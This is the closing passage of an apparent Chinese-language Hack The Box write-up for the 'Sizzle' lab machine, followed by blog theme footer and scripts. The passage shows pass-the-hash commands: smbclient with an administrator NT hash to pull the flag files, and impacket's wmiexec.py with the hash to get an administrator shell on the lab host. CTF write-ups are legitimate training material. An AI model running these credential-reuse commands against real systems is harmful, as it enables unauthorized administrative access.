+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%885.56.47.png" alt="截屏2021-12-01 下午5.56.47"><br>使用 smbclient 登录管理员账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //sizzle.htb.local/C$ -U <span class="string">&quot;administrator&quot;</span> --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267</span><br></pre></td></tr></table></figure>
+<p>分别在用户 mrlky 和管理员桌面下下载两个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \Users\mrlky\Desktop</span><br><span class="line">get user.txt</span><br><span class="line"><span class="built_in">cd</span> \Users\Administrator\Desktop</span><br><span class="line">get root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%886.18.16.png" alt="截屏2021-12-01 下午6.18.16"><br>通过 cat 命令成功获取两个flag<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%886.19.22.png" alt="截屏2021-12-01 下午6.19.22"></p>
+<h3 id="管理员上线"><a href="#管理员上线" class="headerlink" title="管理员上线"></a>管理员上线</h3><p>使用 wmiexec.py 可成功获取管理员权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%8811.45.18.png" alt="截屏2021-12-01 下午11.45.18"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/c31ee5f/">HTB: Bighead<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
